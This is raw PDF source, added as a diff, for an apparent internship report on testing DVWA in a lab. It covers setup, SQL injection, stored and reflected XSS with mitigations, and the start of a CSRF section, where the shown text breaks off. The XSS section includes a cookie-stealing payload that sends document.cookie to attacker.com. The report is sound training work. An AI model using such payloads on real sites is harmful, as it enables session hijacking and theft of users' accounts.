@@ -1,0 +1,1116 @@
+%PDF-1.4
+%‚„œ”
+1 0 obj
+<<
+/Producer (pypdf)
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Count 8
+/Kids [ 4 0 R 12 0 R 15 0 R 19 0 R 21 0 R 23 0 R 25 0 R 27 0 R ]
+>>
+endobj
+3 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+>>
+endobj
+4 0 obj
+<<
+/Contents 5 0 R
+/MediaBox [ 0 0 595.2756 841.8898 ]
+/Resources <<
+/Font <<
+/F1 6 0 R
+/F1-0 7 0 R
+/F2 8 0 R
+/F3 9 0 R
+/F4 10 0 R
+/F5 11 0 R
+>>
+/ProcSet [ /ImageB /ImageC /ImageI /PDF /Text ]
+>>
+/Rotate 0
+/Trans <<
+>>
+/Type /Page
+/Annots [ ]
+/Parent 2 0 R
+>>
+endobj
+5 0 obj
+<<
+/Length 8021
+>>
+stream
+q
+1 0 0 1 0 0 cm  BT /F1 12 Tf 14.4 TL ET
+q
+1 0 0 1 62.69291 770.6929 cm
+Q
+q
+1 0 0 1 62.69291 758.6929 cm
+q
+BT 1 0 0 1 0 0 Tm 84.25488 0 Td 12 TL /F1 12 Tf 0 .4 .6 rg (CYBERSECURITY & ETHICAL HACKING INTERNSHIP) Tj T* -84.25488 0 Td ET
+Q
+Q
+q
+1 0 0 1 62.69291 730.6929 cm
+q
+0 .2 .4 rg
+BT 1 0 0 1 0 4 Tm /F2 20 Tf 12 TL 29.33488 0 Td (Task 3 \227 Web Application Security Testing) Tj T* 173.39 0 Td (Report) Tj T* -202.7249 0 Td ET
+Q
+Q
+q
+1 0 0 1 62.69291 714.6929 cm
+q
+0 .4 .6 rg
+BT 1 0 0 1 0 0 Tm /F1 12 Tf 12 TL 45.74688 0 Td (SQLi | XSS | CSRF | File Inclusion | Burp Suite | Web Security Headers) Tj T* -45.74688 0 Td ET
+Q
+Q
+q
+1 0 0 1 62.69291 708.6929 cm
+q
+2 w
+1 J
+0 .2 .4 RG
+n 0 0 m 469.8898 0 l S
+Q
+Q
+q
+1 0 0 1 62.69291 699.189 cm
+Q
+q
+1 0 0 1 56.69291 611.189 cm
+q
+.933333 .956863 .984314 rg
+n 0 88 481.8898 -22 re f*
+1 1 1 rg
+n 0 66 481.8898 -22 re f*
+.933333 .956863 .984314 rg
+n 0 44 481.8898 -22 re f*
+1 1 1 rg
+n 0 22 481.8898 -22 re f*
+0 .2 .4 rg
+BT /F2 9 Tf 12 TL ET
+BT 1 0 0 1 7 74 Tm (Intern Name:) Tj T* ET
+0 0 0 rg
+BT /F1 9 Tf 12 TL ET
+BT 1 0 0 1 106.2126 74 Tm (Aryan Doshi) Tj T* ET
+0 .2 .4 rg
+BT /F2 9 Tf 12 TL ET
+BT 1 0 0 1 247.9449 74 Tm (Organization:) Tj T* ET
+0 0 0 rg
+BT /F1 9 Tf 12 TL ET
+BT 1 0 0 1 347.1575 74 Tm (ApexPlanet Software Pvt. Ltd.) Tj T* ET
+0 .2 .4 rg
+BT /F2 9 Tf 12 TL ET
+BT 1 0 0 1 7 52 Tm (Task:) Tj T* ET
+0 0 0 rg
+BT /F1 9 Tf 12 TL ET
+BT 1 0 0 1 106.2126 52 Tm (Task 3 \227 Web Application Security) Tj T* ET
+0 .2 .4 rg
+BT /F2 9 Tf 12 TL ET
+BT 1 0 0 1 247.9449 52 Tm (Timeline:) Tj T* ET
+0 0 0 rg
+BT /F1 9 Tf 12 TL ET
+BT 1 0 0 1 347.1575 52 Tm (Days 25\22636) Tj T* ET
+0 .2 .4 rg
+BT /F2 9 Tf 12 TL ET
+BT 1 0 0 1 7 30 Tm (Date:) Tj T* ET
+0 0 0 rg
+BT /F1 9 Tf 12 TL ET
+BT 1 0 0 1 106.2126 30 Tm (2026-07-18) Tj T* ET
+0 .2 .4 rg
+BT /F2 9 Tf 12 TL ET
+BT 1 0 0 1 247.9449 30 Tm (Status:) Tj T* ET
+0 .4 0 rg
+BT /F1 9 Tf 12 TL ET
+BT 1 0 0 1 347.1575 30 Tm (Completed ) Tj /F3 9 Tf 12 TL (3) Tj /F1 9 Tf 12 TL T* ET
+0 .2 .4 rg
+BT /F2 9 Tf 12 TL ET
+BT 1 0 0 1 7 8 Tm (Target App:) Tj T* ET
+0 0 0 rg
+BT /F1 9 Tf 12 TL ET
+BT 1 0 0 1 106.2126 8 Tm (DVWA \(Damn Vulnerable Web App\)) Tj T* ET
+0 .2 .4 rg
+BT /F2 9 Tf 12 TL ET
+BT 1 0 0 1 247.9449 8 Tm (Lab IP:) Tj T* ET
+0 0 0 rg
+BT /F1 9 Tf 12 TL ET
+BT 1 0 0 1 347.1575 8 Tm (192.168.56.101) Tj T* ET
+q
+1 J
+1 j
+.8 .8 .8 RG
+.3 w
+n 0 88 m 481.8898 88 l S
+n 0 0 m 481.8898 0 l S
+n 0 0 m 0 88 l S
+n 481.8898 0 m 481.8898 88 l S
+n 0 66 m 481.8898 66 l S
+n 0 44 m 481.8898 44 l S
+n 0 22 m 481.8898 22 l S
+n 99.2126 0 m 99.2126 88 l S
+n 240.9449 0 m 240.9449 88 l S
+n 340.1575 0 m 340.1575 88 l S
+Q
+Q
+Q
+q
+1 0 0 1 62.69291 602.685 cm
+Q
+q
+1 0 0 1 56.69291 576.685 cm
+q
+0 .2 .4 rg
+n 0 26 481.8898 -26 re f*
+0 0 0 rg
+BT /F1 10 Tf 12 TL ET
+q
+1 0 0 1 12 7 cm
+q
+1 1 1 rg
+BT 1 0 0 1 0 0 Tm /F2 12 Tf 12 TL (1. Objective) Tj T* ET
+Q
+Q
+q
+Q
+Q
+Q
+q
+1 0 0 1 62.69291 571.0157 cm
+Q
+q
+1 0 0 1 62.69291 507.0157 cm
+q
+.133333 .133333 .133333 rg
+BT 1 0 0 1 0 54 Tm /F1 10 Tf 16 TL 2.433516 Tw (The objective of Task 3 is to identify and exploit OWASP Top 10 vulnerabilities in a controlled lab) Tj T* 0 Tw .630888 Tw (environment using DVWA \(Damn Vulnerable Web Application\). Attacks performed include SQL Injection,) Tj T* 0 Tw .349147 Tw (Cross-Site Scripting \(XSS\), Cross-Site Request Forgery \(CSRF\), File Inclusion, and Burp Suite advanced) Tj T* 0 Tw (techniques. Each attack is followed by its mitigation strategy.) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 494.5118 cm
+Q
+q
+1 0 0 1 56.69291 468.5118 cm
+q
+0 .333333 .501961 rg
+n 0 26 481.8898 -26 re f*
+0 0 0 rg
+BT /F1 10 Tf 12 TL ET
+q
+1 0 0 1 12 7 cm
+q
+1 1 1 rg
+BT 1 0 0 1 0 0 Tm /F2 12 Tf 12 TL (2. Lab Setup \227 DVWA on Kali Linux) Tj T* ET
+Q
+Q
+q
+Q
+Q
+Q
+q
+1 0 0 1 62.69291 462.8425 cm
+Q
+q
+1 0 0 1 62.69291 450.8425 cm
+q
+0 .2 .4 rg
+BT 1 0 0 1 0 2 Tm /F2 10 Tf 12 TL (Installation Steps:) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 432.8425 cm
+q
+.941176 .941176 .941176 rg
+n 10 0 459.8898 14 re f*
+Q
+q
+BT 1 0 0 1 10 5 Tm 14 TL /F4 9 Tf 0 .2 0 rg (sudo apt update &) Tj (& sudo apt install dvwa -y) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 415.8425 cm
+q
+.941176 .941176 .941176 rg
+n 10 0 459.8898 14 re f*
+Q
+q
+0 .2 0 rg
+BT 1 0 0 1 10 5 Tm /F4 9 Tf 14 TL (sudo service apache2 start) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 398.8425 cm
+q
+.941176 .941176 .941176 rg
+n 10 0 459.8898 14 re f*
+Q
+q
+0 .2 0 rg
+BT 1 0 0 1 10 5 Tm /F4 9 Tf 14 TL (sudo service mysql start) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 381.8425 cm
+q
+.941176 .941176 .941176 rg
+n 10 0 459.8898 14 re f*
+Q
+q
+0 .2 0 rg
+BT 1 0 0 1 10 5 Tm /F4 9 Tf 14 TL (# Access DVWA: http://127.0.0.1/dvwa) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 364.8425 cm
+q
+.941176 .941176 .941176 rg
+n 10 0 459.8898 14 re f*
+Q
+q
+0 .2 0 rg
+BT 1 0 0 1 10 5 Tm /F4 9 Tf 14 TL (# Login: admin / password) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 347.8425 cm
+q
+.941176 .941176 .941176 rg
+n 10 0 459.8898 14 re f*
+Q
+q
+0 .2 0 rg
+BT 1 0 0 1 10 5 Tm /F4 9 Tf 14 TL (# Set Security Level to LOW for testing) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 339.1732 cm
+Q
+q
+1 0 0 1 56.69291 207.1732 cm
+q
+0 .333333 .501961 rg
+n 0 132 481.8898 -22 re f*
+.941176 .972549 1 rg
+n 0 110 481.8898 -22 re f*
+1 1 1 rg
+n 0 88 481.8898 -22 re f*
+.941176 .972549 1 rg
+n 0 66 481.8898 -22 re f*
+1 1 1 rg
+n 0 44 481.8898 -22 re f*
+.941176 .972549 1 rg
+n 0 22 481.8898 -22 re f*
+1 1 1 rg
+BT /F2 9 Tf 12 TL ET
+BT 1 0 0 1 7 118 Tm (Component) Tj T* ET
+BT 1 0 0 1 120.3858 118 Tm (Details) Tj T* ET
+BT 1 0 0 1 375.5039 118 Tm (Status) Tj T* ET
+0 0 0 rg
+BT /F1 9 Tf 12 TL ET
+BT 1 0 0 1 7 96 Tm (DVWA) Tj T* ET
+BT 1 0 0 1 120.3858 96 Tm (Installed on Kali Linux Apache server) Tj T* ET
+BT 1 0 0 1 375.5039 96 Tm /F3 9 Tf 12 TL (3) Tj /F1 9 Tf 12 TL ( Running) Tj T* ET
+BT 1 0 0 1 7 74 Tm (URL) Tj T* ET
+BT 1 0 0 1 120.3858 74 Tm (http://127.0.0.1/dvwa) Tj T* ET
+BT 1 0 0 1 375.5039 74 Tm /F3 9 Tf 12 TL (3) Tj /F1 9 Tf 12 TL ( Accessible) Tj T* ET
+BT 1 0 0 1 7 52 Tm (Login) Tj T* ET
+BT 1 0 0 1 120.3858 52 Tm (admin / password) Tj T* ET
+BT 1 0 0 1 375.5039 52 Tm /F3 9 Tf 12 TL (3) Tj /F1 9 Tf 12 TL ( Logged In) Tj T* ET
+BT 1 0 0 1 7 30 Tm (Security Level) Tj T* ET
+BT 1 0 0 1 120.3858 30 Tm (LOW \(for exploitation testing\)) Tj T* ET
+BT 1 0 0 1 375.5039 30 Tm /F3 9 Tf 12 TL (3) Tj /F1 9 Tf 12 TL ( Set) Tj T* ET
+BT 1 0 0 1 7 8 Tm (Database) Tj T* ET
+BT 1 0 0 1 120.3858 8 Tm (MySQL \227 DVWA database initialized) Tj T* ET
+BT 1 0 0 1 375.5039 8 Tm /F3 9 Tf 12 TL (3) Tj /F1 9 Tf 12 TL ( Ready) Tj T* ET
+q
+1 J
+1 j
+.666667 .666667 .666667 RG
+.4 w
+n 0 132 m 481.8898 132 l S
+n 0 0 m 481.8898 0 l S
+n 0 0 m 0 132 l S
+n 481.8898 0 m 481.8898 132 l S
+n 0 110 m 481.8898 110 l S
+n 0 88 m 481.8898 88 l S
+n 0 66 m 481.8898 66 l S
+n 0 44 m 481.8898 44 l S
+n 0 22 m 481.8898 22 l S
+n 113.3858 0 m 113.3858 132 l S
+n 368.5039 0 m 368.5039 132 l S
+Q
+Q
+Q
+q
+1 0 0 1 62.69291 198.6693 cm
+Q
+q
+1 0 0 1 56.69291 172.6693 cm
+q
+.545098 0 0 rg
+n 0 26 481.8898 -26 re f*
+0 0 0 rg
+BT /F1 10 Tf 12 TL ET
+q
+1 0 0 1 12 7 cm
+q
+1 1 1 rg
+BT 1 0 0 1 0 0 Tm /F2 12 Tf 12 TL (3. Vulnerability 1 \227 SQL Injection \(SQLi\)) Tj T* ET
+Q
+Q
+q
+Q
+Q
+Q
+q
+1 0 0 1 62.69291 167 cm
+Q
+q
+1 0 0 1 62.69291 155 cm
+q
+0 .2 .4 rg
+BT 1 0 0 1 0 2 Tm /F2 10 Tf 12 TL (What is SQL Injection?) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 103 cm
+q
+.133333 .133333 .133333 rg
+BT 1 0 0 1 0 38 Tm /F1 10 Tf 16 TL 1.680574 Tw (SQL Injection is an attack where malicious SQL code is inserted into an input field to manipulate the) Tj T* 0 Tw 1.760697 Tw (backend database. It can allow attackers to bypass authentication, extract data, modify data, or even) Tj T* 0 Tw (execute system commands.) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 93.33071 cm
+Q
+q
+1 0 0 1 56.69291 71.33071 cm
+q
+.545098 0 0 rg
+n 0 22 481.8898 -22 re f*
+0 0 0 rg
+BT /F1 10 Tf 12 TL ET
+q
+1 0 0 1 12 5 cm
+q
+BT 1 0 0 1 0 2 Tm 12 TL /F2 10 Tf 1 1 1 rg (3.1 Attack \227 Extracting Usernames & Passwords) Tj T* ET
+Q
+Q
+q
+Q
+Q
+Q
+q
+1 0 0 1 62.69291 67.07874 cm
+Q
+ 
+
+Q
+
+q
+0.0 0.0 595.2756 841.8898 re
+W
+n
+1 0 0 1 0 0 cm
+BT
+/F1-0 12 Tf
+14.4 TL
+ET
+0.933333 0.956863 0.984314 rg
+n
+160 681.8898 75 12 re
+f*
+0 0 0 rg
+BT
+/F1-0 9 Tf
+10.8 TL
+ET
+BT
+1 0 0 1 162.9055 685.226 Tm
+(Mayur Sangave) Tj
+T*
+ET
+Q
+
+
+endstream
+endobj
+6 0 obj
+<<
+/BaseFont /Helvetica
+/Encoding /WinAnsiEncoding
+/Name /F1
+/Subtype /Type1
+/Type /Font
+>>
+endobj
+7 0 obj
+<<
+/BaseFont /Helvetica
+/Encoding /WinAnsiEncoding
+/Name /F1
+/Subtype /Type1
+/Type /Font
+>>
+endobj
+8 0 obj
+<<
+/BaseFont /Helvetica-Bold
+/Encoding /WinAnsiEncoding
+/Name /F2
+/Subtype /Type1
+/Type /Font
+>>
+endobj
+9 0 obj
+<<
+/BaseFont /ZapfDingbats
+/Name /F3
+/Subtype /Type1
+/Type /Font
+>>
+endobj
+10 0 obj
+<<
+/BaseFont /Courier
+/Encoding /WinAnsiEncoding
+/Name /F4
+/Subtype /Type1
+/Type /Font
+>>
+endobj
+11 0 obj
+<<
+/BaseFont /Symbol
+/Name /F5
+/Subtype /Type1
+/Type /Font
+>>
+endobj
+12 0 obj
+<<
+/Contents 13 0 R
+/MediaBox [ 0 0 595.2756 841.8898 ]
+/Resources <<
+/Font 14 0 R
+/ProcSet [ /PDF /Text /ImageB /ImageC /ImageI ]
+>>
+/Rotate 0
+/Trans <<
+>>
+/Type /Page
+/Parent 2 0 R
+>>
+endobj
+13 0 obj
+<<
+/Filter [ /ASCII85Decode /FlateDecode ]
+/Length 1849
+>>
+stream
+Gau`TD,]1Y&H9tYfOcmuaTPW<I\P;582(Jn#`3QDFR"<794q'FbDmi8q"J&cedKJI9#EK1^e"@Xl?RPkn+K/b`=FEsqK%0gA,,;E!22*<!T=NDnHfWE4.g`<)C_X14mEVU;E;[Z*f`TD%OAG8*'Gs&S=heJ`6H!+i(u[oaX%A8-FpK$]JGmt*tJ=\3.P9OImgMCK?M)`#o.JtTm&)-rr*%\j,_d;_F7^;`m8_'n+!`DXWT4(%@8Zbmlfu!ZV*,N-rht0Ba1n4P!;0alW"YR`(\&sb\m0%Y[FQO_XTT/9#B^LZAN]-/o]c0>'h/d!JuN`o>5@\hVB<8GYtd0i0DtGa</IG<ONFaHB?$l\&]/Is1mdkB#nNY:f<!@(/Gt(F;<bE:N,hefd+CiRH;kc,e]OZ\XD^l?Z9[61Gu.c0WcQ@fcM89,X)*C8Z-.JO2<l,GVu,I";Wf_(XZt=V`jT&[JQNc9qK2Sk\rM5=+:;-gOm0\A>T(0BX'<r__5/%r!\0,D:^[;Yt4c1MlZ:_Y7GQ4cecP7n7;<?N7j5c(DZP`@'\NCL5^Rc%/J]rROEbfC6R;oD$gKFiR4Odbp!I?9u":Tr>ieDCNr]tLSN8MBlPfn)-0f_>@%SL",'n]\Df@GPmT-KPi7q8iuH5jE(rrMH^(]+OmUO]4:9l$cTc3(emIN:ap1(Mr`("RLShK"@PapT*RW(dN,^q;bi)Gsr.bub3=J)Z<oEbWQ'2tiBh(dm`<JMuS_FD-luO#[\^:h1=&"9*-G>#Qi:Ki>G.3NEME7?LAS^pR/;m:^JBCN#TNgN)h8K5LDCQW%1N\TJ9#"mu"0EQb4;;$&9e[+<%^Anng_F,t(,I$,5+;mhPSAZoJS%jbG,dFmB:d]ugS9d@Wo[l=?gTa/=9KqAG,Si0,T[U.n.M9Eib=`#X?%qY"1Ok7M"WjZrflY4bc#Wk?rC^";X:V@4j%b%C[j2ZT?n'iX[^Yp\c\lo8)_>3i35RG>tU>K.99N0eH$>B"\KV)IHF*=.-h(bk52Z]&D7YX>R@0miS'?BAWk-k4s5QiCH1dEU)crBBlH`3E#&spV$=O4EE1qC1GPG(meS97/?lum`-U"(G/U3-;Yu;e2RctU]@Kk[U?I\jlkmc'<oMJPQsFh;W3.!93!H(hlQtFFI`L?,41Kt&O+PXFd;M+V=5VN^`Oo>Yo?.Eb$^9='\9Di&/RSt7i@*Smg*Y6-_k!W8_5k_/HUu>1=-WgLG0>D;Q%@d(6EA/Y4(lj4^1c^B:)q5$/*upt@qQcC>G4GnY:hC&qlYpK9@';(aR5$-42;2"ZlZm5_maQ.S'-8mVn-qi`ET)*@C=fVEUgm-kBO_bS$='o1sEg0Zh;8i/X\E8V<jf7#!c/tf\fdMY0(6N_l`fHL@&'YFFW<n21U>)4qb#;)od65lo9!#SL'1SA663Ri,>iO(G"iA=*QgP6GEeWo5NTAh+C>of<rLjXNQnH)\%%YfVM0$j*>5l4%CoOg0j'J(5r3h%=XaXo*g)!VorJQpMsEbSd_3lgYq=t%N$hT$qEYj",-^NA?u)R%m`g:(I<C$m2,)l10!hrdkLR/+'JEskJ0@pK_Z$1;60>8V4?"XKR1>TTXFE<&J=-*$)/+J#9102;&HYeARb6i:lm<3+!Sh>)p!pCZPnOi/::bUZ?<ha7@EgV:AH+jcO7e3E&KbrDYn6R&0BNG<.W<Ob9W9W#idbJ-HP(`,j$G'_:=1?.j(2H_/^FL6=`fZ_(l>#_oQ0<1>%AcMMcs!(S_7]`X'44f=!_NU5XAbVS1gk;J`lbQhW8[hb(_=SJE-pM^09rM7q#lnWUf._9ng;:)>dhDF$BbDA]VL%r@d8*<~>
+endstream
+endobj
+14 0 obj
+<<
+/F1 6 0 R
+/F2 8 0 R
+/F3 9 0 R
+/F4 10 0 R
+/F5 11 0 R
+>>
+endobj
+15 0 obj
+<<
+/Contents 16 0 R
+/MediaBox [ 0 0 595.2756 841.8898 ]
+/Resources <<
+/Font <<
+/F1 6 0 R
+/F1-0 17 0 R
+/F2 8 0 R
+/F2-0 18 0 R
+/F3 9 0 R
+/F4 10 0 R
+/F5 11 0 R
+>>
+/ProcSet [ /ImageB /ImageC /ImageI /PDF /Text ]
+>>
+/Rotate 0
+/Trans <<
+>>
+/Type /Page
+/Annots [ ]
+/Parent 2 0 R
+>>
+endobj
+16 0 obj
+<<
+/Length 7563
+>>
+stream
+q
+1 0 0 1 0 0 cm  BT /F1 12 Tf 14.4 TL ET
+q
+1 0 0 1 56.69291 753.1969 cm
+q
+.294118 0 .509804 rg
+n 0 26 481.8898 -26 re f*
+0 0 0 rg
+BT /F1 10 Tf 12 TL ET
+q
+1 0 0 1 12 7 cm
+q
+1 1 1 rg
+BT 1 0 0 1 0 0 Tm /F2 12 Tf 12 TL (4. Vulnerability 2 \227 Cross-Site Scripting \(XSS\)) Tj T* ET
+Q
+Q
+q
+Q
+Q
+Q
+q
+1 0 0 1 62.69291 747.5276 cm
+Q
+q
+1 0 0 1 62.69291 735.5276 cm
+q
+0 .2 .4 rg
+BT 1 0 0 1 0 2 Tm /F2 10 Tf 12 TL (What is XSS?) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 699.5276 cm
+q
+.133333 .133333 .133333 rg
+BT 1 0 0 1 0 22 Tm /F1 10 Tf 16 TL .298555 Tw (Cross-Site Scripting \(XSS\) allows attackers to inject malicious JavaScript into web pages viewed by other) Tj T* 0 Tw (users. It can be used to steal session cookies, redirect users, or perform actions on behalf of victims.) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 689.8583 cm
+Q
+q
+1 0 0 1 56.69291 667.8583 cm
+q
+.294118 0 .509804 rg
+n 0 22 481.8898 -22 re f*
+0 0 0 rg
+BT /F1 10 Tf 12 TL ET
+q
+1 0 0 1 12 5 cm
+q
+1 1 1 rg
+BT 1 0 0 1 0 2 Tm /F2 10 Tf 12 TL (4.1 Stored XSS Attack) Tj T* ET
+Q
+Q
+q
+Q
+Q
+Q
+q
+1 0 0 1 62.69291 663.6063 cm
+Q
+q
+1 0 0 1 62.69291 651.6063 cm
+q
+BT 1 0 0 1 0 2 Tm 12 TL /F2 10 Tf 0 .2 .4 rg (Target Page: DVWA ) Tj /F5 10 Tf 12 TL (\256) Tj /F2 10 Tf 12 TL ( XSS \(Stored\)) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 635.6063 cm
+q
+0 .2 .4 rg
+BT 1 0 0 1 0 2 Tm /F2 10 Tf 12 TL (Attack Payload \227 Cookie Stealer:) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 617.6063 cm
+q
+.941176 .941176 .941176 rg
+n 10 0 459.8898 14 re f*
+Q
+q
+0 .2 0 rg
+BT 1 0 0 1 10 5 Tm /F4 9 Tf 14 TL (alert\("XSS Attack by Aryan!"\);) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 600.6063 cm
+q
+.941176 .941176 .941176 rg
+n 10 0 459.8898 14 re f*
+Q
+q
+0 .2 0 rg
+BT 1 0 0 1 10 5 Tm /F4 9 Tf 14 TL (document.location="http://attacker.com/steal?c="+document.cookie;) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 565.6063 cm
+q
+BT 1 0 0 1 0 22 Tm .09332 Tw 16 TL /F2 10 Tf .133333 .133333 .133333 rg (Result:) Tj /F1 10 Tf ( The script is saved in the database and executes every time any user visits the page. The victim's) Tj T* 0 Tw (session cookie is sent to the attacker's server.) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 557.3543 cm
+Q
+q
+1 0 0 1 56.69291 535.3543 cm
+q
+.294118 0 .509804 rg
+n 0 22 481.8898 -22 re f*
+0 0 0 rg
+BT /F1 10 Tf 12 TL ET
+q
+1 0 0 1 12 5 cm
+q
+1 1 1 rg
+BT 1 0 0 1 0 2 Tm /F2 10 Tf 12 TL (4.2 Reflected XSS Attack) Tj T* ET
+Q
+Q
+q
+Q
+Q
+Q
+q
+1 0 0 1 62.69291 531.1024 cm
+Q
+q
+1 0 0 1 62.69291 519.1024 cm
+q
+BT 1 0 0 1 0 2 Tm 12 TL /F2 10 Tf 0 .2 .4 rg (Target Page: DVWA ) Tj /F5 10 Tf 12 TL (\256) Tj /F2 10 Tf 12 TL ( XSS \(Reflected\)) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 503.1024 cm
+q
+0 .2 .4 rg
+BT 1 0 0 1 0 2 Tm /F2 10 Tf 12 TL (Malicious URL Crafted:) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 485.1024 cm
+q
+.941176 .941176 .941176 rg
+n 10 0 459.8898 14 re f*
+Q
+q
+BT 1 0 0 1 10 5 Tm 14 TL /F4 9 Tf 0 .2 0 rg (http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=) Tj (alert\(1\)) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 466.1024 cm
+q
+BT 1 0 0 1 0 6 Tm 16 TL /F2 10 Tf .133333 .133333 .133333 rg (Result:) Tj /F1 10 Tf ( When victim clicks this link, the script executes in their browser context.) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 457.8504 cm
+Q
+q
+1 0 0 1 56.69291 369.8504 cm
+q
+.294118 0 .509804 rg
+n 0 88 481.8898 -22 re f*
+.972549 .941176 1 rg
+n 0 66 481.8898 -22 re f*
+1 1 1 rg
+n 0 44 481.8898 -22 re f*
+.972549 .941176 1 rg
+n 0 22 481.8898 -22 re f*
+1 1 1 rg
+BT /F2 9 Tf 12 TL ET
+BT 1 0 0 1 7 74 Tm (Type) Tj T* ET
+BT 1 0 0 1 92.03937 74 Tm (How it Works) Tj T* ET
+BT 1 0 0 1 247.9449 74 Tm (Persistence) Tj T* ET
+BT 1 0 0 1 347.1575 74 Tm (Victims Affected) Tj T* ET
+0 0 0 rg
+BT /F1 9 Tf 12 TL ET
+BT 1 0 0 1 7 52 Tm (Stored XSS) Tj T* ET
+BT 1 0 0 1 92.03937 52 Tm (Script saved in DB, runs on page load) Tj T* ET
+BT 1 0 0 1 247.9449 52 Tm (Permanent) Tj T* ET
+BT 1 0 0 1 347.1575 52 Tm (All users who visit page) Tj T* ET
+BT 1 0 0 1 7 30 Tm (Reflected XSS) Tj T* ET
+BT 1 0 0 1 92.03937 30 Tm (Script in URL, runs when link is clicked) Tj T* ET
+BT 1 0 0 1 247.9449 30 Tm (Temporary) Tj T* ET
+BT 1 0 0 1 347.1575 30 Tm (Anyone who clicks the link) Tj T* ET
+BT 1 0 0 1 7 8 Tm (DOM-Based XSS) Tj T* ET
+BT 1 0 0 1 92.03937 8 Tm (Script modifies DOM via client-side JS) Tj T* ET
+BT 1 0 0 1 247.9449 8 Tm (Temporary) Tj T* ET
+BT 1 0 0 1 347.1575 8 Tm (Anyone using the page) Tj T* ET
+q
+1 J
+1 j
+.666667 .666667 .666667 RG
+.4 w
+n 0 88 m 481.8898 88 l S
+n 0 0 m 481.8898 0 l S
+n 0 0 m 0 88 l S
+n 481.8898 0 m 481.8898 88 l S
+n 0 66 m 481.8898 66 l S
+n 0 44 m 481.8898 44 l S
+n 0 22 m 481.8898 22 l S
+n 85.03937 0 m 85.03937 88 l S
+n 240.9449 0 m 240.9449 88 l S
+n 340.1575 0 m 340.1575 88 l S
+Q
+Q
+Q
+q
+1 0 0 1 62.69291 364.1811 cm
+Q
+q
+1 0 0 1 56.69291 342.1811 cm
+q
+0 .4 0 rg
+n 0 22 481.8898 -22 re f*
+0 0 0 rg
+BT /F1 10 Tf 12 TL ET
+q
+1 0 0 1 12 5 cm
+q
+1 1 1 rg
+BT 1 0 0 1 0 2 Tm /F2 10 Tf 12 TL (4.3 XSS Mitigation) Tj T* ET
+Q
+Q
+q
+Q
+Q
+Q
+q
+1 0 0 1 62.69291 337.9291 cm
+Q
+q
+1 0 0 1 62.69291 322.9291 cm
+q
+.133333 .133333 .133333 rg
+BT 1 0 0 1 20 5 Tm /F1 10 Tf 15 TL (\177 Input Validation \227 Strip or reject HTML tags from user input) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 304.9291 cm
+q
+BT 1 0 0 1 20 5 Tm 15 TL /F1 10 Tf .133333 .133333 .133333 rg (\177 Output Encoding \227 Encode < > & " ' characters before displaying) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 286.9291 cm
+q
+.133333 .133333 .133333 rg
+BT 1 0 0 1 20 5 Tm /F1 10 Tf 15 TL (\177 Content Security Policy \(CSP\) \227 Restrict scripts to trusted sources only) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 268.9291 cm
+q
+.133333 .133333 .133333 rg
+BT 1 0 0 1 20 5 Tm /F1 10 Tf 15 TL (\177 HttpOnly Cookie Flag \227 Prevents JavaScript from accessing cookies) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 250.9291 cm
+q
+.133333 .133333 .133333 rg
+BT 1 0 0 1 20 5 Tm /F1 10 Tf 15 TL (\177 Use PHP htmlspecialchars\(\) or htmlentities\(\) on all output) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 233.9291 cm
+q
+.941176 .941176 .941176 rg
+n 10 0 459.8898 14 re f*
+Q
+q
+0 .2 0 rg
+BT 1 0 0 1 10 5 Tm /F4 9 Tf 14 TL (PHP Fix: echo htmlspecialchars\($input, ENT_QUOTES, "UTF-8"\);) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 222.4252 cm
+Q
+q
+1 0 0 1 56.69291 196.4252 cm
+q
+0 .333333 .501961 rg
+n 0 26 481.8898 -26 re f*
+0 0 0 rg
+BT /F1 10 Tf 12 TL ET
+q
+1 0 0 1 12 7 cm
+q
+1 1 1 rg
+BT 1 0 0 1 0 0 Tm /F2 12 Tf 12 TL (5. Vulnerability 3 \227 Cross-Site Request Forgery \(CSRF\)) Tj T* ET
+Q
+Q
+q
+Q
+Q
+Q
+q
+1 0 0 1 62.69291 190.7559 cm
+Q
+q
+1 0 0 1 62.69291 178.7559 cm
+q
+0 .2 .4 rg
+BT 1 0 0 1 0 2 Tm /F2 10 Tf 12 TL (What is CSRF?) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 126.7559 cm
+q
+.133333 .133333 .133333 rg
+BT 1 0 0 1 0 38 Tm /F1 10 Tf 16 TL 1.388443 Tw (CSRF tricks an authenticated user into unknowingly submitting a malicious request. Since the browser) Tj T* 0 Tw .425318 Tw (automatically includes session cookies, the server processes the request as if it came from the legitimate) Tj T* 0 Tw (user.) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 117.0866 cm
+Q
+q
+1 0 0 1 56.69291 95.08661 cm
+q
+0 .333333 .501961 rg
+n 0 22 481.8898 -22 re f*
+0 0 0 rg
+BT /F1 10 Tf 12 TL ET
+q
